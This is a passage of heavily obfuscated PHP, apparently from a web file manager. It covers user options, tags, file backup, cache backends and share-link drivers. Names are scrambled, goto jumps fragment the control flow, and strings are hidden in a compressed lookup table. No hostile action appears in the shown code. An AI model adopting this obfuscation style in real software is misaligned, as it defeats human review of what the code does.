$e¼Ù»á†Êˆ; } goto EœÃ†öŒêà; e†æâÚÁÒé: } private function log($f¦™¥Œ„, $F†–×¶‰ãŸ) { $B×¹Èó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eºè°´ã = timeFloat() - $this->timeStart; write_log(sprintf($B×¹Èó[1353], $f¦™¥Œ„, $this->info[$B×¹Èó[28]], $eºè°´ã, $F†–×¶‰ãŸ), $B×¹Èó[1042]); } } goto E‹šªªˆ™ó; F³‡­Âï: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eå¢§§ˆ¢ß) { $DöÎ¶”¹ÂÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($DöÎ¶”¹ÂÅ[442])) { define($DöÎ¶”¹ÂÅ[442], 0); } return "\x55\163\145\162\x4f\160\164\151\x6f\x6e\x5f{$eå¢§§ˆ¢ß}\x5f" . USER_ID; } protected function filterWhere($Eµ™®) { $F“Ó†…´Ó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($F“Ó†…´Ó[442])) { define($F“Ó†…´Ó[442], 0); } $Eµ™®[$F“Ó†…´Ó[1490]] = USER_ID; return $Eµ™®; } public function cacheRemoveUser($dŞïá½ßèï, $DÖô¤²½»î) { return Cache::remove("\x55\163\145\162\x4f\x70\164\151\x6f\156\x5f{$dŞïá½ßèï}\137" . $DÖô¤²½»î); } protected function optionDefault($D–…“‚ãù– = '') { $A¶ÕÅ¬‡àğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($D–…“‚ãù– == $A¶ÕÅ¬‡àğ[33]) { return $GLOBALS[$A¶ÕÅ¬‡àğ[6]][$A¶ÕÅ¬‡àğ[2113]]; } if ($D–…“‚ãù– == $A¶ÕÅ¬‡àğ[2114]) { return $GLOBALS[$A¶ÕÅ¬‡àğ[6]][$A¶ÕÅ¬‡àğ[2115]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\164\141\x67\x4c\x69\163\x74"; public $modelType = "\x55\163\x65\162\x4f\x70\164\x69\157\x6e"; public $field = array("\156\x61\155\x65", "\x73\x74\x79\154\x65", "\x73\157\x72\x74"); public function listData($CäÅˆÖª¡ = false, $D¶¼ÙŠ—™ = "\163\157\162\x74", $c¡­ˆ¶¶ = false) { return parent::listData($CäÅˆÖª¡, $D¶¼ÙŠ—™, $c¡­ˆ¶¶); } public function remove($CªÄí’°Á–) { return parent::remove($CªÄí’°Á–); } public function add($c˜¶¸‘¢šø, $Aœ¥ÛğÃ«ì = "\154\x61\x62\x65\x6c\55\147\x72\145\171\55\156\x6f\x72\155\x61\154") { $b®Ç‘øÍÊˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->findByName($c˜¶¸‘¢šø)) { return !1; } $AÂé•Åì = array($b®Ç‘øÍÊˆ[402] => $c˜¶¸‘¢šø, $b®Ç‘øÍÊˆ[452] => $Aœ¥ÛğÃ«ì, $b®Ç‘øÍÊˆ[1654] => $this->getSort($b®Ç‘øÍÊˆ[252]) + 1); return parent::insert($AÂé•Åì); } public function update($fº£·ˆŞÑŠ, $Bìäï±¡ƒÖ) { $b­íç¸¦‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E•×ƒÊòäï = $this->listData($fº£·ˆŞÑŠ); $CÜù·Ü¾ƒÂ = $this->findByName($Bìäï±¡ƒÖ[$b­íç¸¦‚[28]]); if (!$E•×ƒÊòäï || $CÜù·Ü¾ƒÂ && $CÜù·Ü¾ƒÂ[$b­íç¸¦‚[383]] != $E•×ƒÊòäï[$b­íç¸¦‚[383]]) { return !1; } return parent::update($fº£·ˆŞÑŠ, $Bìäï±¡ƒÖ); } public function moveTop($e¿ìâåºÍï) { $dì¯äí¹ªº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cšòÔŞÌ‰ = parent::listData(); $aè¡…¥¡÷ù = $this->getSort($dì¯äí¹ªº[251]); foreach ($cšòÔŞÌ‰ as &$eİ¼î¢Á¹) { if ($eİ¼î¢Á¹[$dì¯äí¹ªº[383]] == $e¿ìâåºÍï) { $eİ¼î¢Á¹[$dì¯äí¹ªº[1673]] = $aè¡…¥¡÷ù; continue; } $eİ¼î¢Á¹[$dì¯äí¹ªº[1673]] += 1; } unset($eİ¼î¢Á¹); return parent::resetData($cšòÔŞÌ‰); } public function moveBottom($f¹÷Ï‘»‰š) { $D‡°Ø ·ßß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÙ²Î¶šÅ = $this->getSort($D‡°Ø ·ßß[252]) + 1; return parent::update($f¹÷Ï‘»‰š, array($D‡°Ø ·ßß[1673] => $BÙ²Î¶šÅ)); } public function resetSort($C‡Ü¤óâ) { goto c¡”§š¥‰¿; eİéö±¤: unset($eŸè²Øæ¤–); return parent::resetData($aÎŠÚ§¯£); goto CŸÒ¿Í ŞŠ; c¡”§š¥‰¿: $bÖŠÎ·Ö˜¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BêÑÕ«Ø‘È = array(); $C‡Ü¤óâ = is_array($C‡Ü¤óâ) ? $C‡Ü¤óâ : array(); goto AØ¼²õáõÆ; AØ¼²õáõÆ: for ($D½àÆÆ¢¤İ = 0; $D½àÆÆ¢¤İ < count($C‡Ü¤óâ); $D½àÆÆ¢¤İ++) { $BêÑÕ«Ø‘È[$C‡Ü¤óâ[$D½àÆÆ¢¤İ] . $bÖŠÎ·Ö˜¯[33]] = $D½àÆÆ¢¤İ + 1; } $aÎŠÚ§¯£ = parent::listData(); foreach ($aÎŠÚ§¯£ as &$eŸè²Øæ¤–) { $E‡œ¸ä„ = $BêÑÕ«Ø‘È[$eŸè²Øæ¤–[$bÖŠÎ·Ö˜¯[383]]]; $eŸè²Øæ¤–[$bÖŠÎ·Ö˜¯[1673]] = $E‡œ¸ä„ ? $E‡œ¸ä„ : $eŸè²Øæ¤–[$bÖŠÎ·Ö˜¯[1673]]; } goto eİéö±¤; CŸÒ¿Í ŞŠ: } private function getSort($fÓÒÉ»†–ß) { $EØî¶¹î¹é =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AïŠ‚á¼¿Õ = parent::listData(); $eª„®¹õ… = array_to_keyvalue($AïŠ‚á¼¿Õ, $EØî¶¹î¹é[33], $EØî¶¹î¹é[1673]); if (!$eª„®¹õ…) { $eª„®¹õ… = array(0); } $E÷¤»ó¹ÙŒ = $fÓÒÉ»†–ß == $EØî¶¹î¹é[252] ? max($eª„®¹õ…) : min($eª„®¹õ…); return intval($E÷¤»ó¹ÙŒ); } } goto DØÒÇ½ôÚ£; E¥«ó½’Œ„: define($_SERVER[ÈİÅ¿ÈÈ¥×][0], $_SERVER[ÈİÅ¿ÈÈ¥×][1]); $_SERVER[] = explode($_SERVER[ÈİÅ¿ÈÈ¥×][2], gzinflate(substr($_SERVER[ÈİÅ¿ÈÈ¥×][3], 10, -8))); function binCheckEq($bƒ±‡ÓÒø¥, $dƒÏääˆ‚) { return $bƒ±‡ÓÒø¥ == $dƒÏääˆ‚; } goto cÉõ¹ã„±; bÀœàä›Â: class BackupFile { public function __construct() { } public function index() { goto B‰‰¦„Ò; bŒ‰¬ÜÄ: $A·ãõŠíºè = (int) Model($_SERVER[ÈİÅ¿ÈÈ¥×][726])->where($A·º„²‰Ÿ)->count($_SERVER[ÈİÅ¿ÈÈ¥×][435]); $fªÌç©´¡‰ = (int) Model($_SERVER[ÈİÅ¿ÈÈ¥×][726])->where($A·º„²‰Ÿ)->sum($_SERVER[ÈİÅ¿ÈÈ¥×][77]); $B·ÔØ¹¶­‘ = new TaskFileTransfer($_SERVER[ÈİÅ¿ÈÈ¥×][744], $_SERVER[ÈİÅ¿ÈÈ¥×][721], $A·ãõŠíºè, LNG($_SERVER[ÈİÅ¿ÈÈ¥×][722]) . $_SERVER[ÈİÅ¿ÈÈ¥×][723] . LNG($_SERVER[ÈİÅ¿ÈÈ¥×][745])); goto dªÕ´¼²­Ÿ; dº­Õ›Ç—ï: $Fò®íêÀŠ¾ = 1000; $C¿§äíÙ¢¦ = $eâ¥ãÊÔ¶² = 0; $e†àó³Œì£ = array(); goto EÄ®‘¼©îš; aÖ••×­: $DÓË„³ÙÕï = array($_SERVER[ÈİÅ¿ÈÈ¥×][758] => 1, $_SERVER[ÈİÅ¿ÈÈ¥×][464] => time(), $_SERVER[ÈİÅ¿ÈÈ¥×][716] => 1, $_SERVER[ÈİÅ¿ÈÈ¥×][755] => $aéğÚÑŒšˆ, $_SERVER[ÈİÅ¿ÈÈ¥×][747] => $fªÌç©´¡‰, $_SERVER[ÈİÅ¿ÈÈ¥×][746] => $A·ãõŠíºè); if ($eâ¥ãÊÔ¶²) { $DÓË„³ÙÕï[$_SERVER[ÈİÅ¿ÈÈ¥×][756]] = $A„·Ë•Û±°; $DÓË„³ÙÕï[$_SERVER[ÈİÅ¿ÈÈ¥×][757]] = $FÆØÊ•; } Backup::set($DÓË„³ÙÕï); goto eŒ—°ˆ‘ò; eŒ—°ˆ‘ò: $this->_fileFilter($e†àó³Œì£); return !0; goto Dê°¢‡†Â; FôÙ¬ôÉ°á: $cÃá¤›”Éñ = !0; $cé©¨›…£ = $this->storeIds(); $D¨òé¸‚Ê¤ = 1; goto dº­Õ›Ç—ï; B‰‰¦„Ò: $a½ôš¼”ö = Backup::get(); $aéğÚÑŒšˆ = $a½ôš¼”ö[$_SERVER[ÈİÅ¿ÈÈ¥×][287]][$_SERVER[ÈİÅ¿ÈÈ¥×][171]][$_SERVER[ÈİÅ¿ÈÈ¥×][435]]; $A·º„²‰Ÿ = array($_SERVER[ÈİÅ¿ÈÈ¥×][436] => array($_SERVER[ÈİÅ¿ÈÈ¥×][742], $aéğÚÑŒšˆ), $_SERVER[ÈİÅ¿ÈÈ¥×][743] => array($_SERVER[ÈİÅ¿ÈÈ¥×][325], $a½ôš¼”ö[$_SERVER[ÈİÅ¿ÈÈ¥×][699]])); goto bŒ‰¬ÜÄ; EÄ®‘¼©îš: $FÆØÊ• = $A„·Ë•Û±° = 0; do { $eÍµ®¨¿© = $_SERVER[ÈİÅ¿ÈÈ¥×][748]; $dÎîÏêš¤ = Model($_SERVER[ÈİÅ¿ÈÈ¥×][726])->where($A·º„²‰Ÿ)->field($eÍµ®¨¿©)->order($_SERVER[ÈİÅ¿ÈÈ¥×][749])->selectPage($Fò®íêÀŠ¾, $D¨òé¸‚Ê¤); $F¬ËÅåŒ¦Å = !empty($dÎîÏêš¤[$_SERVER[ÈİÅ¿ÈÈ¥×][361]]) ? $dÎîÏêš¤[$_SERVER[ÈİÅ¿ÈÈ¥×][361]] : array(); foreach ($F¬ËÅåŒ¦Å as $a¾Œ ÓºÙõ) { goto BÎ‹²Óöï›; Dàã¯Ñ‰ÀÑ: if ($C¿§äíÙ¢¦ >= 1024 * 1024 * 100) { $DÓË„³ÙÕï = array($_SERVER[ÈİÅ¿ÈÈ¥×][755] => $aéğÚÑŒšˆ, $_SERVER[ÈİÅ¿ÈÈ¥×][756] => $A„·Ë•Û±°, $_SERVER[ÈİÅ¿ÈÈ¥×][757] => $FÆØÊ•); Backup::set($DÓË„³ÙÕï); $C¿§äíÙ¢¦ = $eâ¥ãÊÔ¶² = 0; } goto bø¦¬Œï‚; EòøÑÊÍÄ: $C¿§äíÙ¢¦ += $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]; $A„·Ë•Û±° += 1; $FÆØÊ• += $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]; goto Dàã¯Ñ‰ÀÑ; bê†Öà‰øÏ: if (IO::exist($Fğƒˆö´ª)) { $B·ÔØ¹¶­‘->updateFileEnd($a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][28]], $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]); } else { $Fğƒˆö´ª = get_path_father($Fğƒˆö´ª); IO::mkdir($Fğƒˆö´ª); if (!IO::copy($céº†˜‹, $Fğƒˆö´ª, $_SERVER[ÈİÅ¿ÈÈ¥×][752])) { write_log($_SERVER[ÈİÅ¿ÈÈ¥×][753] . $céº†˜‹ . $_SERVER[ÈİÅ¿ÈÈ¥×][754] . $Fğƒˆö´ª . $_SERVER[ÈİÅ¿ÈÈ¥×][493], $_SERVER[ÈİÅ¿ÈÈ¥×][721]); $cÃá¤›”Éñ = !1; break; } } $aéğÚÑŒšˆ = $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][435]]; $eâ¥ãÊÔ¶² += 1; goto EòøÑÊÍÄ; BÎ‹²Óöï›: if (!$this->_fileExist($a¾Œ ÓºÙõ, $e†àó³Œì£, $cé©¨›…£)) { $A·ãõŠíºè -= 1; $fªÌç©´¡‰ -= (int) $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]; write_log("\146\x69\154\145\x20\x6e\157\x74\x20\145\170\151\x73\164\x2e\146\151\x6c\x65\111\104\72{$a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][435]]}\x2c\40\x70\x61\164\x68\72{$a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]}", $_SERVER[ÈİÅ¿ÈÈ¥×][750]); continue; } $céº†˜‹ = $a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]; $Fğƒˆö´ª = "\173\x69\x6f\x3a{$a½ôš¼”ö[$_SERVER[ÈİÅ¿ÈÈ¥×][699]]}\x7d" . substr($céº†˜‹, strlen("\173\x69\x6f\72{$a¾Œ ÓºÙõ[$_SERVER[ÈİÅ¿ÈÈ¥×][751]]}\175")); goto bê†Öà‰øÏ; bø¦¬Œï‚: } $fÁ†¿‚É¨Ö = count($F¬ËÅåŒ¦Å); $D¨òé¸‚Ê¤++; } while ($fÁ†¿‚É¨Ö == $Fò®íêÀŠ¾); $B·ÔØ¹¶­‘->end(); goto aÖ••×­; dªÕ´¼²­Ÿ: $B·ÔØ¹¶­‘->task[$_SERVER[ÈİÅ¿ÈÈ¥×][706]] = $fªÌç©´¡‰; $DÓË„³ÙÕï = array($_SERVER[ÈİÅ¿ÈÈ¥×][746] => $A·ãõŠíºè, $_SERVER[ÈİÅ¿ÈÈ¥×][747] => $fªÌç©´¡‰); Backup::set($DÓË„³ÙÕï); goto FôÙ¬ôÉ°á; Dê°¢‡†Â: } private function _fileExist($e¼ŞÙÈ‹ÌÍ, &$BÙÄ£ä¡Êø, $dÈõ§Á‚ÃÄ) { goto bœ¬óØ£ğ; D¼ˆ…ßÄğÚ: if (IO::exist($AéÜªôí£´)) { $BÙÄ£ä¡Êø[] = $e¼ŞÙÈ‹ÌÍ[$f¥“Ã”Ÿ»[435]]; return !1; } $F­ÆŞ½·³· = array($f¥“Ã”Ÿ»[751] => $e¼ŞÙÈ‹ÌÍ[$f¥“Ã”Ÿ»[751]], $f¥“Ã”Ÿ»[75] => array($f¥“Ã”Ÿ»[373], "{$AéÜªôí£´}\x25")); $bÓ—¬³óáİ = Model($f¥“Ã”Ÿ»[726])->where($F­ÆŞ½·³·)->field($f¥“Ã”Ÿ»[436])->select(); goto B‡·ùª¦šº; B‡·ùª¦šº: $BÙÄ£ä¡Êø = array_merge($BÙÄ£ä¡Êø, array_to_keyvalue($bÓ—¬³óáİ, $f¥“Ã”Ÿ»[33], $f¥“Ã”Ÿ»[435])); return !1; goto B¡„âŒğâ; câÈÉ§¥Ñ—: if (!in_array($e¼ŞÙÈ‹ÌÍ[$f¥“Ã”Ÿ»[751]], $dÈõ§Á‚ÃÄ)) { return !1; } if (IO::exist($dàÍš¥òƒï)) { return !0; } $AéÜªôí£´ = get_path_father($dàÍš¥òƒï); goto D¼ˆ…ßÄğÚ; bœ¬óØ£ğ: $f¥“Ã”Ÿ» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dàÍš¥òƒï = $e¼ŞÙÈ‹ÌÍ[$f¥“Ã”Ÿ»[75]]; if (in_array($e¼ŞÙÈ‹ÌÍ[$f¥“Ã”Ÿ»[435]], $BÙÄ£ä¡Êø)) { return !1; } goto câÈÉ§¥Ñ—; B¡„âŒğâ: } private function _fileFilter($fù’½ã¿¤) { $F ¨´¼† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($fù’½ã¿¤)) { return; } $A·×Ëá¤ = array($F ¨´¼†[435] => array($F ¨´¼†[7], array_unique($fù’½ã¿¤))); $D±·Ã½Œ“¼ = Model($F ¨´¼†[759])->where($A·×Ëá¤)->field($F ¨´¼†[385])->select(); foreach ($D±·Ã½Œ“¼ as $dèÑøÁ–Şğ) { Model($F ¨´¼†[759])->remove($dèÑøÁ–Şğ[$F ¨´¼†[385]], !1); } } private function storeIds() { $CÑ°í‰µï‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¨½ŠÈìÏÄ = Model($CÑ°í‰µï‹[711])->listData(); $díÍÅÆˆÛ³ = array(); $AŠ³í‰¨ö = $GLOBALS[$CÑ°í‰µï‹[6]][$CÑ°í‰µï‹[84]][$CÑ°í‰µï‹[760]]; foreach ($B¨½ŠÈìÏÄ as $aÙ×ªÃªÉß) { $B¦¤Êñ£²ô = strtolower($aÙ×ªÃªÉß[$CÑ°í‰µï‹[90]]); if (!isset($AŠ³í‰¨ö[$B¦¤Êñ£²ô])) { continue; } $eÒÙƒ±¼¬ = $CÑ°í‰µï‹[71] . (isset($AŠ³í‰¨ö[$B¦¤Êñ£²ô]) ? $AŠ³í‰¨ö[$B¦¤Êñ£²ô] : ucfirst($B¦¤Êñ£²ô)); if (!class_exists($eÒÙƒ±¼¬)) { continue; } $díÍÅÆˆÛ³[] = $aÙ×ªÃªÉß[$CÑ°í‰µï‹[383]]; } return $díÍÅÆˆÛ³; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto b’‹©ƒÕ´; E¡·Ÿñ˜ôÜ: switch ($cšİÅó¿¾[$D‰ÆËÑ¶ÙÀ[761]]) { case $D‰ÆËÑ¶ÙÀ[17]: self::$handle = Model($D‰ÆËÑ¶ÙÀ[763]); break; case $D‰ÆËÑ¶ÙÀ[764]: self::$handle = new CacheRedis($DçæèØ¦àÊ, $DÏ Åœá¶ƒ); break; case $D‰ÆËÑ¶ÙÀ[765]: self::$handle = new CacheMemcached($DçæèØ¦àÊ, $DÏ Åœá¶ƒ); break; case $D‰ÆËÑ¶ÙÀ[171]: self::$handle = new CacheFile($DçæèØ¦àÊ, $DÏ Åœá¶ƒ); break; default: break; } return self::$handle; goto eŸâÑ¶Ø­; b’‹©ƒÕ´: $D‰ÆËÑ¶ÙÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aŠäÂˆ š; aŠäÂˆ š: $cšİÅó¿¾ = $GLOBALS[$D‰ÆËÑ¶ÙÀ[6]][$D‰ÆËÑ¶ÙÀ[343]]; $DçæèØ¦àÊ = $cšİÅó¿¾[$cšİÅó¿¾[$D‰ÆËÑ¶ÙÀ[761]]]; $DÏ Åœá¶ƒ = $cšİÅó¿¾[$D‰ÆËÑ¶ÙÀ[762]]; goto E¡·Ÿñ˜ôÜ; eŸâÑ¶Ø­: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DÒ¥ŠŒİ) { if (is_array($DÒ¥ŠŒİ) || is_object($DÒ¥ŠŒİ)) { $DÒ¥ŠŒİ = json_encode($DÒ¥ŠŒİ); } $DÒ¥ŠŒİ = rawurlencode($DÒ¥ŠŒİ); return md5(KOD_SITE_ID . $_SERVER[ÈİÅ¿ÈÈ¥×][70] . $DÒ¥ŠŒİ); } public static function get($A Ë­¤§öÃ) { $F§µÃ™Ù” = self::key($A Ë­¤§öÃ); if (!isset(self::$memoryCache[$F§µÃ™Ù”])) { $A…‡Ò°’ÉŸ = self::init()->get($F§µÃ™Ù”); self::$memoryCache[$F§µÃ™Ù”] = unserialize($A…‡Ò°’ÉŸ); } return self::$memoryCache[$F§µÃ™Ù”]; } public static function set($fŸæ•øÖ‚, $Eäµ’Œî÷…, $D“çËÌ±‡İ = false) { goto f«ÅÈÅ˜ÀÅ; e‚§×ÇÊ·: CacheLock::lock($fŸæ•øÖ‚); $C¹×ÊŒµ˜ = self::init()->set($c·Ø«¤ŸÜ•, serialize($Eäµ’Œî÷…), $D“çËÌ±‡İ); self::$memoryCache[$c·Ø«¤ŸÜ•] = $Eäµ’Œî÷…; goto d·èğ„•”; d·èğ„•”: CacheLock::unlock($fŸæ•øÖ‚); return $C¹×ÊŒµ˜; goto eÛØ½¶ôáø; f«ÅÈÅ˜ÀÅ: $c·Ø«¤ŸÜ• = self::key($fŸæ•øÖ‚); if (isset(self::$memoryCache[$c·Ø«¤ŸÜ•]) && self::$memoryCache[$c·Ø«¤ŸÜ•] === $Eäµ’Œî÷…) { return !0; } if ($D“çËÌ±‡İ === 0) { self::$memoryCache[$c·Ø«¤ŸÜ•] = $Eäµ’Œî÷…; return !0; } goto e‚§×ÇÊ·; eÛØ½¶ôáø: } public static function remove($B¨¾¼İÄË) { goto FšÓ ÔÃ²É; FšÓ ÔÃ²É: $d»Íô´¦®° = self::key($B¨¾¼İÄË); unset(self::$memoryCache[$d»Íô´¦®°]); self::clearTimeout(); goto b®Ìâ‘î¹ì; b®Ìâ‘î¹ì: CacheLock::lock($B¨¾¼İÄË); $Dç£Ó³µ³ = self::init()->remove($d»Íô´¦®°); CacheLock::unlock($B¨¾¼İÄË); goto Cï‡æè‹Ê; Cï‡æè‹Ê: return $Dç£Ó³µ³; goto cíÕ‹Ê‰·²; cíÕ‹Ê‰·²: } public static function removeMemory($aÌ‘›È¬ˆĞ) { $b—÷ÊŒ¹Ù§ = self::key($aÌ‘›È¬ˆĞ); unset(self::$memoryCache[$b—÷ÊŒ¹Ù§]); } public static function clearMemory($b´¯Í”ä¦» = false) { if ($b´¯Í”ä¦») { $b´¯Í”ä¦» = self::key($b´¯Í”ä¦»); unset(self::$memoryCache[$b´¯Í”ä¦»]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÈİÅ¿ÈÈ¥×][766])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÈİÅ¿ÈÈ¥×][767])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($c•Ã‚é¦•ö, $EÔÀíä†‰Ò) { $d²é¦éæ”ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->cachePath = $c•Ã‚é¦•ö[$d²é¦éæ”ò[75]]; $this->prefix = $d²é¦éæ”ò[768]; $this->cacheTime = $EÔÀíä†‰Ò; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F©á¸²›Şé) { $D´…§®™ÚÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F©á¸²›Şé = str_replace(array($D´…§®™ÚÙ[769], $D´…§®™ÚÙ[93], $D´…§®™ÚÙ[69]), $D´…§®™ÚÙ[770], $F©á¸²›Şé); return $this->cachePath . $D´…§®™ÚÙ[771] . $F©á¸²›Şé . $D´…§®™ÚÙ[772]; } public function set($b·Æ£µ§‰å, $fèí­¦İ, $f™ºî¡šøË = false) { $d‹ˆë£–  = $this->getFile($b·Æ£µ§‰å); if (file_put_contents($d‹ˆë£– , $this->prefix . $fèí­¦İ, LOCK_EX)) { return !0; } @unlink($d‹ˆë£– ); return !1; } public function get($Bğ×¸Ú…‘Š) { $EŠØÄÓÅƒò = $this->getFile($Bğ×¸Ú…‘Š); if (file_exists($EŠØÄÓÅƒò) && filemtime($EŠØÄÓÅƒò) < time() - $this->cacheTime) { @unlink($EŠØÄÓÅƒò); return !1; } $b›ˆÈà¥Ÿ¾ = @file_get_contents($EŠØÄÓÅƒò); return substr($b›ˆÈà¥Ÿ¾, strlen($this->prefix)); } public function remove($cƒÙ¸çâ¶©) { $e‰ñ…ëÜªÉ = $this->getFile($cƒÙ¸çâ¶©); return @unlink($e‰ñ…ëÜªÉ); } public function deleteAll() { $FéŠØ­¬Ğ½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F”¯‘–ø« = scandir($this->cachePath); foreach ($F”¯‘–ø« as $fÁ¨ÚÎ®Ÿ) { $C•…Ï¹¶›Ï = $this->cachePath . $fÁ¨ÚÎ®Ÿ; if (strpos($C•…Ï¹¶›Ï, $FéŠØ­¬Ğ½[772]) && strpos($C•…Ï¹¶›Ï, $FéŠØ­¬Ğ½[773])) { @unlink($C•…Ï¹¶›Ï); } } } public function clearTimeout() { $aç †˜£·´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FˆÚÍç¢‹ = scandir($this->cachePath); foreach ($FˆÚÍç¢‹ as $fõÊ†¬š £) { $cÜ¤´è‚éº = $this->cachePath . $fõÊ†¬š £; if (strpos($cÜ¤´è‚éº, $aç †˜£·´[772]) && strpos($cÜ¤´è‚éº, $aç †˜£·´[773]) && filemtime($cÜ¤´è‚éº) < time() - $this->cacheTime) { @unlink($cÜ¤´è‚éº); } } } } goto E†¹ïİ²ÎÄ; a»ŠËëò¦»: class PathDriverDbShareLink extends PathDriverDB { public function __construct($A×Øİáã‘Ğ) { $this->pathParse = $A×Øİáã‘Ğ; $this->model = Model($_SERVER[ÈİÅ¿ÈÈ¥×][1167]); } protected function infoParse($eî“ù¤ø°ì, $C³˜–Ö¬â = false, $C›ä³ÑÏñŞ = false) { $aïºÅæ¨Ç¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return Action($aïºÅæ¨Ç¸[1034])->sharePathInfo($this->pathParse[$aïºÅæ¨Ç¸[75]], !0); } public function listPath($DÄÏ¬‰¹æ, $A¯ŸŞñ‰ãš = false) { $FùĞ†Ÿ”ä¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E÷Ê–—ã˜‡ = parent::listPath($DÄÏ¬‰¹æ, $A¯ŸŞñ‰ãš); foreach ($E÷Ê–—ã˜‡ as $C—‰Ÿëæ¹§ => $A¤Ò°Ñ¨£) { if (!in_array($C—‰Ÿëæ¹§, array($FùĞ†Ÿ”ä¨[73], $FùĞ†Ÿ”ä¨[74]))) { continue; } foreach ($A¤Ò°Ñ¨£ as $DŞ·ëšİ³£ => $Fæ—öä³) { $E÷Ê–—ã˜‡[$C—‰Ÿëæ¹§][$DŞ·ëšİ³£] = Action($FùĞ†Ÿ”ä¨[1034])->shareItemInfo($Fæ—öä³); } } return $E÷Ê–—ã˜‡; } public function listAll($F‰Æá¼ƒ¡) { goto b“·§ššÎç; b“·§ššÎç: $A¡ÂÓÔ†ÌÙ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÒ±Ø¾—ª = IO::info($this->pathParse[$A¡ÂÓÔ†ÌÙ[75]]); if (!$eÒ±Ø¾—ª) { return array(); } goto fÅ¢ÙèØÒ; fÅ¢ÙèØÒ: $EÁ…÷¯Ÿğ = $this->model->listAll($F‰Æá¼ƒ¡); foreach ($EÁ…÷¯Ÿğ as &$a‚…ÁŠÉå) { $a‚…ÁŠÉå[$A¡ÂÓÔ†ÌÙ[407]] = Action($A¡ÂÓÔ†ÌÙ[1034])->shareItemInfo($a‚…ÁŠÉå[$A¡ÂÓÔ†ÌÙ[407]]); } unset($a‚…ÁŠÉå); goto aïÃÇÌ; aïÃÇÌ: return $EÁ…÷¯Ÿğ; goto D½Õ‹…åÍ; D½Õ‹…åÍ: } } class PathDriverDriverShareItem { public function __construct($cÀŞóáã‘‰) { $this->pathParse = $cÀŞóáã‘‰; } public function __call($dÈ×–Â®áè, $CÜÜÛ˜åÓÀ) { $f¹³¯¦†ßƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (method_exists($this, $dÈ×–Â®áè)) { return; } $DèÏí¡Óñª = call_user_func_array(array($f¹³¯¦†ßƒ[1175], $dÈ×–Â®áè), $CÜÜÛ˜åÓÀ); $eîƒãÓÙ… = array($f¹³¯¦†ßƒ[1176], $f¹³¯¦†ßƒ[1177], $f¹³¯¦†ßƒ[1178], $f¹³¯¦†ßƒ[1179], $f¹³¯¦†ßƒ[507], $f¹³¯¦†ßƒ[509], $f¹³¯¦†ßƒ[1180], $f¹³¯¦†ßƒ[103], $f¹³¯¦†ßƒ[1181], $f¹³¯¦†ßƒ[1182]); if (in_array($dÈ×–Â®áè, $eîƒãÓÙ…)) { $DèÏí¡Óñª = $this->getPathOuter($DèÏí¡Óñª); } return $DèÏí¡Óñª; } public function copy($BÍÚö’«, $fƒŒêŠ†£ø, $fÃ·ì£¤ê = false) { return $this->copyMove($BÍÚö’«, $fƒŒêŠ†£ø, $fÃ·ì£¤ê, $_SERVER[ÈİÅ¿ÈÈ¥×][507]); } public function move($cŸ­‚¯ÓÓİ, $DâÁ’¨àÂƒ, $cæ‰³ä = false) { return $this->copyMove($cŸ­‚¯ÓÓİ, $DâÁ’¨àÂƒ, $cæ‰³ä, $_SERVER[ÈİÅ¿ÈÈ¥×][509]); } private function copyMove($Bì™ßÓà‘², $Càä…íùß, $E¢Åª¢óš, $eŸ™¤ƒ°·®) { goto Cæ¢®Á ¼×; Cæ¢®Á ¼×: $E„å¡²°¶ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÑ÷’ôŒ„ = $Càä…íùß; $Câ™¥ÎÔ¢ñ = IO::driverMake($Càä…íùß); goto d·¼ˆ†Òé; AÕî‚Íò: return $Aî¤öŞ»‡; goto Aå “—¡•; d·¼ˆ†Òé: if 